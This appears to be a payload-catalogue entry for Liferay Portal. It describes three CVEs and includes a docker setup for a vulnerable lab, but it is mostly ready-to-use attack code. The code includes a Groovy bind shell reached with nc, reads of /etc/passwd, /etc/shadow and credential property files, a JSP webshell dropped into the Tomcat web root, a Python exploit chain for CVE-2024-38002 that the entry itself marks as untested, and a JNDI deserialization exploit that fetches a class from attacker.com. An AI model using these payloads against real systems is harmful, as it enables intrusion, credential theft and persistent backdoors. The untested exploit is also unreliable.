comment: "Liferay Portal is a Java-based enterprise CMS and portal platform.\n\nCVE-2020-7961\
  \ (CVSS 9.8, CISA KEV): Unauthenticated RCE via Java deserialization in the\n`/api/jsonws`\
  \ endpoint. Liferay's JSON Web Services API deserializes user-supplied data\nwithout\
  \ validation when invoking the `DDMDataProviderInstance` service. The `invokerURL`\n\
  parameter is passed to an unmarshaller that performs a JNDI lookup, triggering\n\
  deserialization of attacker-controlled data via the c3p0\n`com.mchange.v2.c3p0.WrapperConnectionPoolDataSource`\
  \ gadget chain. A successful exploit\nexecutes arbitrary code as the Liferay process\
  \ user. Affects Liferay Portal 6.1.0 through\n7.2.1 GA2. Fixed in 7.2.1 CE GA2 and\
  \ DXP fix packs.\nnuclei: CVE-2020-7961\nExploitDB: 50/50070\n\nCVE-2024-38002 (CVSS\
  \ 9.0): Authenticated RCE via the Kaleo Workflow headless REST API.\nThe `/o/headless-admin-workflow/v1.0/workflow-definitions`\
  \ endpoint fails to verify\nthat the caller has permission to modify workflow definitions.\
  \ Any authenticated user\n(not just admins) can submit a workflow definition containing\
  \ an embedded Groovy script,\nwhich the Kaleo engine executes server-side as the\
  \ Liferay process user.\nAffects Portal 7.3.2\u20137.4.3.111 / DXP 2023.Q4.0\u2013\
  Q4.5, 2023.Q3.1\u2013Q3.8.\n\nCVE-2025-3639 (High): MFA bypass via GET login. Sending\
  \ credentials via a GET request\nto /c/portal/login (password in query string) bypasses\
  \ the MFA challenge entirely.\nAffects Portal 7.3.0\u20137.4.3.132 / DXP 2024.Q1.1\u2013\
  2025.Q1.6.\n\nAdmin RCE via Groovy script console: Liferay Portal exposes a server-side\
  \ scripting\nconsole at /group/control_panel/manage/-/server/script for server administrators.\n\
  Arbitrary Groovy code executes inside the JVM as the Liferay process user.\n"
docker:
  compose: "services:\n  liferay:\n    image: liferay/portal:7.2.1-ga2\n    ports:\n\
    \      - \"8080:8080\"\n    environment:\n      LIFERAY_SETUP_PERIOD_WIZARD_PERIOD_ENABLED:\
    \ \"false\"\n      LIFERAY_TERMS_PERIOD_OF_PERIOD_USE_PERIOD_REQUIRED: \"false\"\
    \n      LIFERAY_USERS_PERIOD_REMINDER_PERIOD_QUERIES_PERIOD_ENABLED: \"false\"\
    \n"
  note: 'Starts Liferay Portal 7.2.1 GA2 (vulnerable to CVE-2020-7961 unauthenticated

    deserialization RCE). Startup takes approximately 3 minutes.

    Access at `http://localhost:8080`. Default admin credentials: test@liferay.com
    / test.

    The Groovy script console is at:

    /group/control_panel/manage/-/server/script

    after logging in as admin.

    '
functions:
  bind-shell:
  - code: |
      // Groovy script console: bind shell on TCP 12345
      // Submit at: /group/control_panel/manage/-/server/script
      ServerSocket server = new ServerSocket(12345)
      Socket client = server.accept()
      Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start()
      InputStream ci = client.getInputStream()
      OutputStream co = client.getOutputStream()
      InputStream pi = p.getInputStream()
      OutputStream po = p.getOutputStream()
      while (!client.isClosed()) {
          while (pi.available() > 0) co.write(pi.read())
          while (ci.available() > 0) po.write(ci.read())
          co.flush()
          po.flush()
          Thread.sleep(50)
      }
      p.destroy()
      server.close()
    comment: |
      Groovy script console opens a TCP bind shell on port 12345 bridged to /bin/sh.
      The HTTP request to the script console hangs while the bind shell is active.
      Connect from the attacker with: nc victim.com 12345
    connector: tcp-client
    contexts:
      admin:
      console:
    platform: linux
    tty: false
  file-read:
  - code: |
      // Groovy script console: read an arbitrary file
      println new File("/etc/passwd").text
    comment: |
      Reads an arbitrary server-side file via the Groovy script console.
      Useful for extracting database credentials from
      /opt/liferay/data/portal-setup-wizard.properties or
      /opt/liferay/tomcat-*/webapps/ROOT/WEB-INF/classes/portal-ext.properties.
    contexts:
      admin:
      console:
  file-write:
  - code: |
      // Groovy script console: write arbitrary content to the filesystem
      new File("/opt/liferay/tomcat-9.0.17/webapps/ROOT/shell.jsp").text = \
          '<%@ page import="java.io.*" %><%String c=request.getParameter("c");if(c!=null){String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);out.print(new String(p.getInputStream().readAllBytes()));}%>'
    comment: |
      Writes arbitrary content to the filesystem via the Groovy script console.
      The example drops a JSP webshell into the Liferay Tomcat web root.
      Adjust the path for the exact Tomcat version in use (check /opt/liferay/).
      Access the shell at: http://victim.com:8080/shell.jsp?c=id
    contexts:
      admin:
      console:
  rce:
  - code: |
      #!/usr/bin/env python3
      # CVE-2024-38002: authenticated RCE via Kaleo Workflow Groovy execution
      # Any authenticated user can create a workflow definition with embedded Groovy.
      # The Kaleo engine executes the script when the workflow state is entered.

      import requests

      TARGET = "http://victim.com:8080"
      USER   = "user@liferay.com"
      PASS   = "userpassword"

      CMD = "id > /tmp/rce_out.txt"

      workflow_xml = f"""<?xml version="1.0"?>
      <workflow-definition
          xmlns="urn:liferay.com:liferay-workflow_7.4.0"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="urn:liferay.com:liferay-workflow_7.4.0
              http://www.liferay.com/dtd/liferay-workflow-definition_7_4_0.dtd">
        <name>exploit</name>
        <description>exploit</description>
        <version>1</version>
        <state>
          <name>created</name>
          <initial>true</initial>
          <actions>
            <action>
              <name>trigger</name>
              <script><![CDATA[
                def proc = ["/bin/sh", "-c", "{CMD}"].execute()
                proc.waitFor()
              ]]></script>
              <script-language>groovy</script-language>
              <execution-type>onEntry</execution-type>
            </action>
          </actions>
          <transitions>
            <transition><name>done</name><target>approved</target></transition>
          </transitions>
        </state>
        <state><name>approved</name><initial>false</initial></state>
      </workflow-definition>"""

      # Step 1: upload the malicious workflow definition
      r = requests.post(
          f"{TARGET}/o/headless-admin-workflow/v1.0/workflow-definitions",
          auth=(USER, PASS),
          headers={"Content-Type": "application/xml"},
          data=workflow_xml,
          verify=False,
      )
      wf_id = r.json().get("id")
      print(f"Workflow created: {wf_id}")

      # Step 2: assign the workflow to a content type (e.g. Journal Articles)
      requests.put(
          f"{TARGET}/o/headless-admin-workflow/v1.0/workflow-definitions/{wf_id}/assign-to-asset-types",
          auth=(USER, PASS),
          json=[{"assetType": "com.liferay.journal.model.JournalArticle"}],
          verify=False,
      )

      # Step 3: create a Journal Article to trigger a new workflow instance
      # (or submit any existing asset in the workflow through a transition)
      requests.post(
          f"{TARGET}/o/headless-delivery/v1.0/sites/20122/structured-contents",
          auth=(USER, PASS),
          json={
              "title": "exploit",
              "contentStructureId": 0,
              "contentFields": [],
          },
          verify=False,
      )
      # The onEntry Groovy script executes when the workflow instance is created.
      # Output is written to /tmp/rce_out.txt on the Liferay host.
    comment: "CVE-2024-38002 (CVSS 9.0): The Kaleo Workflow headless API does not\
      \ enforce\npermission checks on workflow definition creation/update. Any authenticated\n\
      user (not just admins) can submit a workflow definition containing a Groovy\n\
      script, which executes server-side as the Liferay process user when a workflow\n\
      instance enters the defined state.\nRef: https://liferay.dev/portal/security/known-vulnerabilities/-/asset_publisher/jekt/content/cve-2024-38002\n\
      \n\u26A0\uFE0F Unverified payload: no public standalone PoC exists. The workflow\
      \ XML schema,\nsite ID (20122 is the default Liferay guest community but may\
      \ differ), and trigger\nsequence (structured content creation \u2192 onEntry\
      \ execution) are derived from Liferay\nAPI documentation and the CVE advisory,\
      \ not a tested exploit. Verify the site ID\nvia GET /o/headless-delivery/v1.0/sites\
      \ and confirm the onEntry trigger fires\nbefore relying on this payload.\n"
    contexts:
      authenticated:
    version: |-
      Portal 7.3.2 - 7.4.3.111 / DXP 2023.Q4.0-Q4.5, 2023.Q3.1-Q3.8
  - code: |
      # CVE-2020-7961: unauthenticated RCE via JSONWS deserialization
      # Requires: ysoserial (https://github.com/frohoff/ysoserial) and
      #           a JNDI exploit server (e.g., marshalsec or JNDI-Exploit-Kit)
      # 1. Start a JNDI exploit server pointing to a remote class that runs the command:
      #    java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/evil/#Exploit" 1099
      # 2. Send the deserialization trigger:
      python3 - <<'EOF'
      import requests

      TARGET = "http://victim.com:8080"
      JNDI   = "rmi://attacker.com:1099/Exploit"

      # The invokerURL parameter causes Liferay to perform a JNDI lookup
      # which deserializes the response via c3p0 WrapperConnectionPoolDataSource
      r = requests.post(
          TARGET + "/api/jsonws/invoke",
          data={
              "cmd": '{"$invokerURL":"' + JNDI + '"}',
              "/api/jsonws/invoke": "",
          },
      )
      print(r.status_code, r.text[:200])
      EOF
    comment: |
      CVE-2020-7961: Liferay's JSONWS API passes the invokerURL value to a c3p0
      WrapperConnectionPoolDataSource, triggering a JNDI lookup that deserializes
      the remote class. The deserialized payload executes as the Liferay process user.
      Pair with marshalsec or JNDI-Exploit-Kit to serve the malicious class.
      nuclei: CVE-2020-7961
      ExploitDB: 50070
      Metasploit: exploit/multi/misc/liferay_java_deserialization
    contexts:
      unauthenticated:
    version: |
      6.1.0 - 7.2.1 GA2 (before 7.2.1 CE GA2 / DXP fix packs)
  - code: |
      // Groovy script console: execute OS command and return output
      // Submit at: /group/control_panel/manage/-/server/script
      def cmd = ["id"].execute()
      cmd.waitFor()
      println cmd.text
    comment: |
      Liferay Portal's server-side Groovy script console executes arbitrary JVM code
      as the Liferay process user. Access requires the Administrator role.
      Use a List form for commands with arguments:
        ["/bin/sh", "-c", "cat /etc/shadow"].execute()
    contexts:
      admin:
      console:
    platform: linux
